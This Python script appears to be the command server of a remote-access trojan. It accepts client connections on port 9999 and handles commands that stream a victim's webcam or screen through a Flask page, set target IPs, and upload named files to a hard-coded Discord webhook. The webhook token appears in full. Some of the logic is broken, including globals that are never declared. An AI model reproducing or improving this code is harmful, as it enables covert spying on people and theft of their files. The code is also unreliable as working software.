import socket
import threading
from flask import Flask, render_template
import os
import time
import requests

# Global variables
clients = []  # List of connected client IPs
target_ip = None
streaming_enabled = False
stream_type = None  # "webcam" or "screen"

# Flask server to stream webcam or screen
app = Flask(__name__)

@app.route('/')
def index():
    if streaming_enabled:
        return render_template('stream.html', target_ip=target_ip, stream_type=stream_type, status="Playing", start_time=time.strftime("%Y-%m-%d %H:%M:%S"))
    else:
        return "Streaming Stopped"

def start_web_server():
    app.run(host='0.0.0.0', port=5000)

# Handle incoming client connections
def handle_client_connection(client_socket):
    global target_ip
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if data.startswith("!webcam_stream"):
                # Start webcam streaming
                streaming_enabled = True
                stream_type = "webcam"
                start_web_server()
            elif data.startswith("!screen_stream"):
                # Start screen streaming
                streaming_enabled = True
                stream_type = "screen"
                start_web_server()
            elif data.startswith("!list"):
                # List all connected clients
                for client in clients:
                    print(f"Client IP: {client}")
            elif data.startswith("!set target"):
                target_ip = data.split()[2]
                print(f"Target set to {target_ip}")
            elif data.startswith("!remove target"):
                target_ip = None
                print("Target removed")
            elif data.startswith("!download"):
                filename = data.split()[1]
                send_file_to_discord(filename)
            elif data.startswith("!exit"):
                break
        except Exception as e:
            print(f"Error handling client data: {e}")
            break

# Server listener for accepting client connections
def server_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Listening on port 9999
    server.listen(5)
    print("Server listening for connections...")
    
    while True:
        client_socket, addr = server.accept()
        print(f"Client connected from {addr}")
        clients.append(addr[0])  # Add client IP to the list
        threading.Thread(target=handle_client_connection, args=(client_socket,)).start()

def send_file_to_discord(filename):
    webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
    files = {'file': open(filename, 'rb')}
    data = {'content': '[*] Sending...'}
    requests.post(webhook_url, files=files, data=data)
    print("[+] Sent!")

if __name__ == "__main__":
    threading.Thread(target=server_listener).start()
